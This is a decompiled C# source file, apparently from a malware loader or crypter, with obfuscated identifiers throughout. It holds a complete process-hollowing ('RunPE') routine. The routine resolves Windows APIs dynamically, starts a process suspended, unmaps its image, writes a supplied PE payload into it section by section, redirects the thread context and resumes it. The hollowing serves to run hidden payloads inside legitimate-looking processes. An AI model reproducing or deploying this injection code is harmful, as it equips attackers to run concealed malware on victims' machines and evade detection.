using System;
using System.Runtime.InteropServices;
using System.Text;
using KaMaL.My;
using Microsoft.VisualBasic.CompilerServices;
using ns0;

namespace KaMaL;

[StandardModule]
public sealed class cDsuOaxlniBDIMDsUvHfZwdLOAJyVcwtcxkDnLTiOAM
{
	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool UmxzehCaptCofCItLmgxm(IntPtr whhUQgZmxFLNVssCQcgTgWgBeZOsxHRz, uint[] Part2);

	public delegate uint KSnicSAVyMDSFOyuz(IntPtr whhUQgZmxFLNVssCQcgTgWgBeZOsxHRz);

	public delegate uint XRSJOfbzGbcliwcTzQdFmgQESOEmlXABzaXHh(IntPtr whhUQgZmxFLNVssCQcgTgWgBeZOsxHRz, IntPtr Part2);

	public delegate IntPtr OMeGNNtVJRRLVxpIuuLSFIxvXJyujOhNiReNXrnAavwRLOpjTMDkGlY(IntPtr whhUQgZmxFLNVssCQcgTgWgBeZOsxHRz, IntPtr Part2, IntPtr Part3, int Part4, int Part5);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool lJgyPrfPksNeVLrEaRZTGUw(IntPtr whhUQgZmxFLNVssCQcgTgWgBeZOsxHRz, uint[] Part2);

	public delegate bool cyteUaNlONGCutEwJUgNfMBalacKDYvbHUyKrXjhwERTyXwgROyMcn(IntPtr whhUQgZmxFLNVssCQcgTgWgBeZOsxHRz, IntPtr Part2, byte[] Part3, uint Part4, int Part5);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool OYlxxoGBKwFzmJwwyiUMLgiKKLTmn(IntPtr whhUQgZmxFLNVssCQcgTgWgBeZOsxHRz, IntPtr Part2, ref IntPtr Part3, int Part4, ref IntPtr Part5);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool MhKveQUwsjqNSDUhFROKGcFdloZWMHsIrLSqjaLPS(string whhUQgZmxFLNVssCQcgTgWgBeZOsxHRz, StringBuilder Part2, IntPtr Part3, IntPtr Part4, [MarshalAs(UnmanagedType.Bool)] bool Part5, int Part6, IntPtr Part7, string Part8, byte[] Part9, IntPtr[] whhUQgZmxFLNVssCQcgTgWgBeZOsxHRz0);

	private static UmxzehCaptCofCItLmgxm umxzehCaptCofCItLmgxm_0 = dslDfzkFmDNOrAwEQIylTYsvbynG<UmxzehCaptCofCItLmgxm>("kernel32", "SetThreadContext");

	private static KSnicSAVyMDSFOyuz ksnicSAVyMDSFOyuz_0 = dslDfzkFmDNOrAwEQIylTYsvbynG<KSnicSAVyMDSFOyuz>("kernel32", "ResumeThread");

	private static XRSJOfbzGbcliwcTzQdFmgQESOEmlXABzaXHh xrsjofbzGbcliwcTzQdFmgQESOEmlXABzaXHh_0 = dslDfzkFmDNOrAwEQIylTYsvbynG<XRSJOfbzGbcliwcTzQdFmgQESOEmlXABzaXHh>("ntdll", "NtUnmapViewOfSection");

	private static OMeGNNtVJRRLVxpIuuLSFIxvXJyujOhNiReNXrnAavwRLOpjTMDkGlY omeGNNtVJRRLVxpIuuLSFIxvXJyujOhNiReNXrnAavwRLOpjTMDkGlY_0 = dslDfzkFmDNOrAwEQIylTYsvbynG<OMeGNNtVJRRLVxpIuuLSFIxvXJyujOhNiReNXrnAavwRLOpjTMDkGlY>("kernel32", "VirtualAllocEx");

	private static lJgyPrfPksNeVLrEaRZTGUw lJgyPrfPksNeVLrEaRZTGUw_0 = dslDfzkFmDNOrAwEQIylTYsvbynG<lJgyPrfPksNeVLrEaRZTGUw>("kernel32", "GetThreadContext");

	private static cyteUaNlONGCutEwJUgNfMBalacKDYvbHUyKrXjhwERTyXwgROyMcn cyteUaNlONGCutEwJUgNfMBalacKDYvbHUyKrXjhwERTyXwgROyMcn_0 = dslDfzkFmDNOrAwEQIylTYsvbynG<cyteUaNlONGCutEwJUgNfMBalacKDYvbHUyKrXjhwERTyXwgROyMcn>("kernel32", "WriteProcessMemory");

	private static OYlxxoGBKwFzmJwwyiUMLgiKKLTmn oylxxoGBKwFzmJwwyiUMLgiKKLTmn_0 = dslDfzkFmDNOrAwEQIylTYsvbynG<OYlxxoGBKwFzmJwwyiUMLgiKKLTmn>("kernel32", "ReadProcessMemory");

	private static MhKveQUwsjqNSDUhFROKGcFdloZWMHsIrLSqjaLPS mhKveQUwsjqNSDUhFROKGcFdloZWMHsIrLSqjaLPS_0 = dslDfzkFmDNOrAwEQIylTYsvbynG<MhKveQUwsjqNSDUhFROKGcFdloZWMHsIrLSqjaLPS>("kernel32", "CreateProcessA");

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr Handle, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

	public static T dslDfzkFmDNOrAwEQIylTYsvbynG<T>(string WTaUKGU, string HubzhvFdJoVIDMlMDeZBILdHBMuIG)
	{
		T result = (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref WTaUKGU), ref HubzhvFdJoVIDMlMDeZBILdHBMuIG), typeof(T));
		MyComputer.smethod_5();
		return result;
	}

	public static bool gQxmZWgxbbwYsBInMZOQHQajBsWaBgE(byte[] UtFaUIfHRDuchvQlDzOay, string TFMSDisnSiiQyHXZHmWUEMTgeWrKFTsv)
	{
		bool flag;
		checked
		{
			try
			{
				IntPtr zero = IntPtr.Zero;
				IntPtr[] array = new IntPtr[4];
				byte[] part = new byte[68];
				int num = BitConverter.ToInt32(UtFaUIfHRDuchvQlDzOay, 60);
				int num2 = BitConverter.ToInt16(UtFaUIfHRDuchvQlDzOay, num + 6);
				IntPtr intPtr = new IntPtr(BitConverter.ToInt32(UtFaUIfHRDuchvQlDzOay, num + 84));
				if (mhKveQUwsjqNSDUhFROKGcFdloZWMHsIrLSqjaLPS_0(null, new StringBuilder(TFMSDisnSiiQyHXZHmWUEMTgeWrKFTsv), zero, zero, Part5: false, 4, zero, null, part, array))
				{
					uint[] array2 = new uint[179];
					array2[0] = 65538u;
					if (lJgyPrfPksNeVLrEaRZTGUw_0(array[1], array2))
					{
						IntPtr part2 = new IntPtr(unchecked((long)array2[41]) + 8L);
						IntPtr Part = IntPtr.Zero;
						IntPtr intPtr2 = new IntPtr(4);
						IntPtr Part2 = IntPtr.Zero;
						if ((oylxxoGBKwFzmJwwyiUMLgiKKLTmn_0(array[0], part2, ref Part, (int)intPtr2, ref Part2) && unchecked((long)xrsjofbzGbcliwcTzQdFmgQESOEmlXABzaXHh_0(array[0], Part)) == 0L) ? true : false)
						{
							IntPtr part3 = new IntPtr(BitConverter.ToInt32(UtFaUIfHRDuchvQlDzOay, num + 52));
							IntPtr part4 = new IntPtr(BitConverter.ToInt32(UtFaUIfHRDuchvQlDzOay, num + 80));
							IntPtr part5 = omeGNNtVJRRLVxpIuuLSFIxvXJyujOhNiReNXrnAavwRLOpjTMDkGlY_0(array[0], part3, part4, 12288, 64);
							int part6 = default(int);
							cyteUaNlONGCutEwJUgNfMBalacKDYvbHUyKrXjhwERTyXwgROyMcn_0(array[0], part5, UtFaUIfHRDuchvQlDzOay, (uint)(int)intPtr, part6);
							int num3 = num2 - 1;
							int num4 = num3;
							int num5 = 0;
							while (true)
							{
								int num6 = num5;
								int num7 = num4;
								if (num6 > num7)
								{
									break;
								}
								int[] array3 = new int[10];
								Buffer.BlockCopy(UtFaUIfHRDuchvQlDzOay, num + 248 + num5 * 40, array3, 0, 40);
								byte[] array4 = new byte[array3[4] - 1 + 1];
								Buffer.BlockCopy(UtFaUIfHRDuchvQlDzOay, array3[5], array4, 0, array4.Length);
								part4 = new IntPtr(part5.ToInt32() + array3[3]);
								part3 = new IntPtr(array4.Length);
								cyteUaNlONGCutEwJUgNfMBalacKDYvbHUyKrXjhwERTyXwgROyMcn_0(array[0], part4, array4, (uint)(int)part3, part6);
								num5++;
							}
							part4 = new IntPtr(unchecked((long)array2[41]) + 8L);
							part3 = new IntPtr(4);
							cyteUaNlONGCutEwJUgNfMBalacKDYvbHUyKrXjhwERTyXwgROyMcn_0(array[0], part4, BitConverter.GetBytes(part5.ToInt32()), (uint)(int)part3, part6);
							array2[44] = (uint)(part5.ToInt32() + BitConverter.ToInt32(UtFaUIfHRDuchvQlDzOay, num + 40));
							umxzehCaptCofCItLmgxm_0(array[1], array2);
						}
					}
					ksnicSAVyMDSFOyuz_0(array[1]);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				flag = false;
				ProjectData.ClearProjectError();
				goto IL_02c8;
			}
			flag = true;
			goto IL_02c8;
		}
		IL_02c8:
		bool result = flag;
		Class6.smethod_4();
		return result;
	}
}
